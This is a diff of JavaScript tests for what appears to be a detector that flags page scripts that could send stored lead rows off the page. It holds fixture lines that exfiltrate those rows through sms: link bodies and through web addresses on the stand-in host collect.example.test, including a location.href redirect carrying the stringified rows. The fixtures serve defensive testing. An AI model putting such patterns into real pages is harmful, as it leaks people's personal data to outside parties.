@@ -294,6 +294,44 @@ test("every sink the script judge holds has a break test, and each one turns the
   assert.equal(computed.status, "FAIL", "an attribute name the judge cannot read is a hit");
 });
 
+// ── A tap-to-text or tap-to-call link to one number is not a send ──────────────────────────────────────
+
+const ADDRESS_WORDS = "sets an address from script (href, src, formAction, ping, srcset, poster)";
+
+test("a phone link to one number keeps the row green: sms: or tel: plus one plain property read", async () => {
+  const GREEN = {
+    "tap to text (the live page's own line)": `${KEEPS} var lead = {phone: "not a real number"}; var a = document.createElement("a"); a.href = 'sms:' + lead.phone; a.textContent = lead.phone;`,
+    "tap to call": `${KEEPS} var a = document.createElement("a"); a.href = "tel:" + lead.phone;`,
+    "a fixed number": `${KEEPS} var a = document.createElement("a"); a.href = "tel:+1 (555) 010-0000";`,
+    "an earlier string does not shift which one is read": `${KEEPS} var u = "https://collect.example.test/"; a.href = "sms:" + row.number;`,
+  };
+  for (const [name, script] of Object.entries(GREEN)) {
+    const row = await leadsRow({ html: page({ script }) });
+    assert.equal(row.status, "PASS", `${name}: ${row.detail}`);
+  }
+});
+
+test("any address that can carry the rows is still red, phone schemes included", async () => {
+  const RED = {
+    "a text with the rows as its message": `${KEEPS} a.href = "sms:?body=" + JSON.stringify(rows);`,
+    "a second piece after the number": `${KEEPS} a.href = 'sms:' + lead.phone + '?body=' + rows;`,
+    "a body inside the literal": `${KEEPS} a.href = "sms:+15550100000?body=hi" + lead.phone;`,
+    "a web address with the number in it": `${KEEPS} a.href = 'https://collect.example.test/?n=' + lead.phone;`,
+    "a phone word held in an earlier string": `${KEEPS} var t = "sms:"; a.href = "https://collect.example.test/" + t;`,
+    "a call on the literal": `${KEEPS} a.href = 'sms:x'.replace('sms:x', target);`,
+    "added to, not set": `${KEEPS} a.href += 'sms:' + lead.phone;`,
+    "a src, not an href": `${KEEPS} a.poster = 'tel:' + lead.phone;`,
+    "no closing mark, so the next line could join it": `${KEEPS} a.href = 'sms:' + lead.phone\n(send)(rows)`,
+    "a variable, not a literal": `${KEEPS} a.href = target;`,
+    "a mailto link": `${KEEPS} a.href = "mailto:" + lead.email;`,
+  };
+  for (const [name, script] of Object.entries(RED)) {
+    const row = await leadsRow({ html: page({ script }) });
+    assert.equal(row.status, "FAIL", name);
+    assert.ok(row.detail.includes(ADDRESS_WORDS), `${name}: ${row.detail}`);
+  }
+});
+
 test("the ten pages that read green before generation 3 are all red now", async () => {
   const REPORTED = {
     "script moves the visitor": page({ script: `${KEEPS} location.href = "https://collect.example.test/?d=" + JSON.stringify(rows);` }),
